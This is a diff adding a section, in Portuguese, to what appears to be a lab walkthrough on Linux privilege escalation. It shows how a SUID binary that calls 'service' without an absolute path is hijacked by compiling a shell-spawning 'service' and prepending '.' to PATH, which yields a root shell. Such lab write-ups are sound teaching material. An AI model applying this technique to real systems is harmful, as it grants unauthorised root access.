@@ -648,3 +648,55 @@ bash-4.1#
 ### Questões:
 
 - a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
+## 13 - SUID / SGID Executables - Environment Variables 
+
+O executável ***/usr/local/bin/suid-env*** pode ser explorado por herdar a variável de ambiente PATH do usuário e tentar executar programas sem especificar um caminho absoluto.
+
+Ao executar o arquivo, percebe-se que ele parece estar tentando iniciar o servidor apache2:
+
+```shell
+user@debian:~$ /usr/local/bin/suid-env
+[....] Starting web server: apache2httpd (pid 1723) already running
+. ok 
+```
+Execute usando o comando strings no arquivo para procurar strings de caracteres imprimíveis:
+
+```shell
+user@debian:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+```
+
+Uma linha ("service apache2 start") sugere que o executável do serviço está sendo chamado para iniciar o servidor web, porém o caminho completo do executável (***/usr/sbin/service***) não está sendo usado.
+
+Compile o código localizado em ***/home/user/tools/suid/service.c*** em um executável chamado ***service***. Este código simplesmente gera um shell Bash:
+
+```shell
+gcc -o service /home/user/tools/suid/service.c
+```
+Anexe o diretório atual (ou onde o novo executável do serviço está localizado) para a variável PATH e execute o executável suid-env para obter um shell com elevação de privilégios:
+
+```shell
+user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
+root@debian:~# 
+```
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
+
